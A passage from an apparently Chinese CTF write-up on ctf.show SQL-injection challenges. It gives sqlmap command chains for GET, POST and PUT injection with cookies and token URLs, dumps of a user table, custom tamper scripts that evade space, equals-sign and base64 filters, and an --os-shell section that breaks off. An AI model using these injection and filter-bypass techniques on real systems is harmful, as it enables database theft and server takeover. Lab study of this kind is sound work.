<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检测注入类型(实际使用中感觉这步可以省略，下面那条语句在如果没有执行这个语句的条件下，也会执行这个，先执行这个后面的执行倒是会快一点的)</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出库名</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出表名</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出数据</span></span><br><span class="line">python sqlmap.py -u http://e6892756-6d65-47f6-baf8-5617a68a1b0f.challenge.ctf.show/api/?<span class="built_in">id</span>=<span class="number">1</span> --user-agent sqlmap --referer ctf.show -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --dump</span><br></pre></td></tr></table></figure></div>



<h3 id="post-方式提交数据"><a href="#post-方式提交数据" class="headerlink" title="post 方式提交数据"></a>post 方式提交数据</h3><p><strong>使用post方式进行注入，可以直接用<code>--data=&quot;id=1&quot;</code>，也可以<code>--method=post</code>来触发</strong></p>
<p>(有些时候url带上双引号不会出问题，有些时候又会出问题，奇奇怪怪，要是提示host not find 就把双引号删吧删吧)</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">第一步用--data调整参数</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span></span><br><span class="line">第二步</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --dbs</span><br><span class="line">第三步</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line">第四步 (--dump是列字段值，也可以单独带上列名，重新写一句，使用列名参数前的字符是： -C )</span><br><span class="line">python sqlmap.py -u http://69c5a44d-b5e5-47b2-a8dd-a87006ae618d.challenge.ctf.show/api/ --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --columns --dump</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="put-请求方式"><a href="#put-请求方式" class="headerlink" title="put 请求方式"></a>put 请求方式</h3><p><strong>–method 指定 put 请求方式，url 要带 index.php(这个应该是这个题的限制)，<font color=red>还要加上 –headers&#x3D;”Content-Type: text&#x2F;plain” 便于 put 接收表单参数，一定要加上–headers&#x3D;“Content-Type: text&#x2F;plain” ，否则是按表单提交的，put接收不到</font></strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user --columns</span><br><span class="line"></span><br><span class="line">（这里就是上一题说到的单独写一句。但是明明可以一下写完，何必呢）</span><br><span class="line">python sqlmap.py -u http://6837fe82-c4cc-40ec-<span class="number">9804</span>-27f49ab108e4.challenge.ctf.show:<span class="number">8080</span>/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user -C <span class="keyword">pass</span> --dump</span><br></pre></td></tr></table></figure></div>



<h3 id="cookie"><a href="#cookie" class="headerlink" title="__cookie"></a>__cookie</h3><p><strong>使用–cookie 带上 PHPSESSID（F12），其余不变。</strong></p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820170331410.png"
                      alt="image-20220820170331410"
                ></p>
<hr>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检测注入类型（实际执行过可以正常执行）</span></span><br><span class="line">python sqlmap.py -u http://80489c9e-aacb-4f78-b399-c43b9dfb4f3d.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=72enlin9c8r1o7ffnq16sd3a52; ctfshow=a5ee758751b072ac4b2ec52827ba7c50&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line">剩下的自己搭配就行了=。=</span><br><span class="line">还有就是切记不要刷新页面（我在做题的时候怕容器被关了，时不时刷新看看，结果前几次sqlmap都没成功，因为刷新之后会改变cookie，粗心大意给忘了）</span><br></pre></td></tr></table></figure></div>



<h3 id="权限"><a href="#权限" class="headerlink" title="_权限"></a>_权限</h3><p><strong>（好像还是put方法，其他方法我没试过（好像有type&#x3D;text就是put？），主要是sqlmap还是有点点慢）</strong></p>
<p>每次在进行查询之前都会先访问一次 url&#x2F;api&#x2F;getToken.php，否则会返回 api 鉴权失败。</p>
<p><strong>先看题提示</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820172654426.png"
                      alt="image-20220820172654426"
                ></p>
<p><strong>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，可以用burpsuite抓包看看确实是这么回事</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png"
                      alt="img"
                ></p>
<p><strong>–safe-url 设置在测试目标地址前访问的安全链接–safe-freq 设置两次注入测试前访问安全链接的次数</strong></p>
<p><strong>（或者查看日志发现 &#x2F;api&#x2F;getToken.php 的访问）</strong></p>
<p><strong>所以我们需要两个参数</strong></p>
<p>设置参数 –safe-url 和 –safe-freq 在调用 api 前访问 token 链接。</p>
<p>–safe-url 设置在测试目标地址前访问的安全链接<br>–safe-freq 设置两次注入测试前访问安全链接的次数</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://43ba86e5-c013-<span class="number">4491</span>-84bc-7de872c19b94.challenge.ctf.show/api/index.php --referer=ctf.show --cookie=<span class="string">&quot;PHPSESSID=umd7ocdluu007vvfk4t37e03pe;&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --method=PUT --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=http://43ba86e5-c013-<span class="number">4491</span>-84bc-7de872c19b94.challenge.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span></span><br><span class="line"><span class="comment">#（最好把cookie也带上，我开始用没有cookie的语句，sqlmap提醒我没有给出cookie，他帮我自动获取了=。=）</span></span><br><span class="line"> </span><br><span class="line">后面的也不多写了，自己换就ok</span><br></pre></td></tr></table></figure></div>



<h3 id="闭合"><a href="#闭合" class="headerlink" title="_闭合"></a>_闭合</h3><p>sqlmap会帮我们自动闭合的，不用管。CTFer勇敢飞，sqlmap永相随 ：）</p>
<h2 id="207-213（需要自己写tamper）"><a href="#207-213（需要自己写tamper）" class="headerlink" title="207-213（需要自己写tamper）"></a>207-213（需要自己写tamper）</h2><h3 id="tamper绕过空格"><a href="#tamper绕过空格" class="headerlink" title="tamper绕过空格"></a>tamper绕过空格</h3><p><strong>题目提示要用 –tamper 加载自己写的 tamper</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看代码是过滤了空格</p>
<h4 id="1-使用自带的tamper"><a href="#1-使用自带的tamper" class="headerlink" title="1.使用自带的tamper"></a>1.使用自带的tamper</h4><p>我们看看自带的和空格有关的tamper，发现有很多，这里使用 sapce2comment 绕过。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220820181216652.png"
                      alt="0"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment</span><br></pre></td></tr></table></figure></div>

<p><strong>常用的tamper有：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apostrophemask.py 用utf8代替引号 </span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号 </span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号 </span><br><span class="line">space2hash.py 空格替换为#号 随机字符串 以及换行符 </span><br><span class="line">space2comment.py 用/**/代替空格 </span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 </span><br><span class="line">space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符 </span><br><span class="line">appendnullbyte.py Microsoft Access在有效负荷结束位置加载零字节字符编码 </span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤 </span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号 base64encode.py 用base64编码 </span><br><span class="line">space2mssqlhash.py mssql查询中替换空格 </span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释 </span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号 </span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） </span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格 </span><br><span class="line">space2plus.py 用+替换空格 </span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like </span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代 </span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集 </span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾 </span><br><span class="line">chardoubleencode.py 双url编码(不处理以编码的) </span><br><span class="line">unionalltounion.py 替换UNION ALL SELECT UNION SELECT </span><br><span class="line">charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码； </span><br><span class="line">randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line">randomcomments.py 用/**/分割sql关键字 </span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码 </span><br><span class="line">securesphere.py 追加特制的字符串 </span><br><span class="line">versionedmorekeywords.py MySQL &gt;= 5.1.13注释绕过 </span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释</span><br></pre></td></tr></table></figure></div>







<h4 id="2-自己写一个tamper"><a href="#2-自己写一个tamper" class="headerlink" title="2.自己写一个tamper"></a>2.自己写一个tamper</h4><p><a class="link"   href="https://y4er.com/posts/sqlmap-tamper/" >Sqlmap Tamper 编写 - Y4er的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>基本tamper格式</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>(): <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>): <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>编写好之后放在tamper文件夹里面即可（假设我们写的脚本名为my.py），使用时用参数 <code>--tamper=my</code></strong></p>
<h3 id="tamper绕过等号"><a href="#tamper绕过等号" class="headerlink" title="tamper绕过等号"></a>tamper绕过等号</h3><p><strong>题目过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//TODO 未完工</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>自己写的tamper（写的比较简单&#x3D;。&#x3D; ）</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里like前后都有空格，不然换过去就挨在一起了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br></pre></td></tr></table></figure></div>



<p><strong>payload（每个payload都是自己跑过的，能行）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://279072f9-ae8f-4679-878d-c27582903424.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2ogfogma59tankn0mes95of14u;&quot;</span> --referer=ctf.show --safe-url=<span class="string">&quot;http://279072f9-ae8f-4679-878d-c27582903424.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;koishi_=toLike&quot;</span></span><br><span class="line"></span><br><span class="line">后续还是不多bb</span><br><span class="line">--dbs</span><br><span class="line">-D</span><br><span class="line">-D -T --columns --dump</span><br></pre></td></tr></table></figure></div>





<h3 id="tamper加密解密"><a href="#tamper加密解密" class="headerlink" title="tamper加密解密"></a>tamper加密解密</h3><p>（学习过程中发现自己的python语法的愈加熟练了 大概&#x3D;。&#x3D;）</p>
<h4 id="1-看题目"><a href="#1-看题目" class="headerlink" title="1.看题目"></a><strong>1.看题目</strong></h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="2-思考"><a href="#2-思考" class="headerlink" title="2.思考"></a>2.思考</h4><p><strong>这里对id的处理：base64解码 -&gt; 逆序 -&gt; base64解码 -&gt; 逆序</strong></p>
<p><strong>所以我们传入的id要让他被还原为正确的id</strong></p>
<p><strong>做法</strong> ：</p>
<ul>
<li><p>payload逆序   </p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">payload[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>编码</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>逆序</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里我看其他师傅是将这里编码再解码，实际我尝试的时候发现字节数组也可以用[::-1]，所以这个转换根本没必要</span></span><br><span class="line"></span><br><span class="line">base64.b64encode(payload[::-<span class="number">1</span>].encode())[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64.b64encode(base64.b64encode(payload[::-1].encode()).decode()[::-1].encode())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>因为php那里接受的是str类型，所以后面又加一个.decode()</p>
</li>
</ul>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php base64_decode语法</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">base64_decode</span>(<span class="keyword">string</span> <span class="variable">$data</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据php修改的py代码</span></span><br><span class="line"></span><br><span class="line">base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br><span class="line">或</span><br><span class="line">base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode())[::-<span class="number">1</span>]).decode()</span><br></pre></td></tr></table></figure></div>



<h4 id="3-编写tamper"><a href="#3-编写tamper" class="headerlink" title="3.编写tamper"></a><strong>3.编写tamper</strong></h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>部分语法说明</p>
<ul>
<li><p><strong>1. a[::-1]是数组给反序，因为题目上的php函数strrev为反序，但是python莫得这种函数，就是用[::-1]的形式逆序</strong></p>
</li>
<li><p><strong>2. str.encode 和 base64.b64encode 是两个不同的东西</strong></p>
<ul>
<li><p><strong>str.encode是实现字符串的编码，默认为utf-8，返回的是字节类型的数据</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;abc123&quot;</span></span><br><span class="line">result2=payload.encode()</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行结果：b&#x27;abc123&#x27;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>base64.b64encode 他会将参数进行base64编码，注意需要的是bytes类型的对象，而不是str。这也就是为什么我们将str使用了encode</strong></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h4><p>(这里我把url的双引号去掉了，又反而不行了，加上才行，奇奇怪怪)</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://13543e7f-244a-4b6e-9c86-578a363b0156.challenge.ctf.show/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=3c40sipvi2amochjb0mpj9d9dq;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://13543e7f-244a-4b6e-9c86-578a363b0156.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p><strong>后面紧接着的题本质上差不多，tamper我也一起放这了</strong></p>
<p>编码加上绕过空格</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload.replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure></div>



<h3 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h3><p>和上一题完全一样，但 flag 不在表里，而是在文件里面</p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span 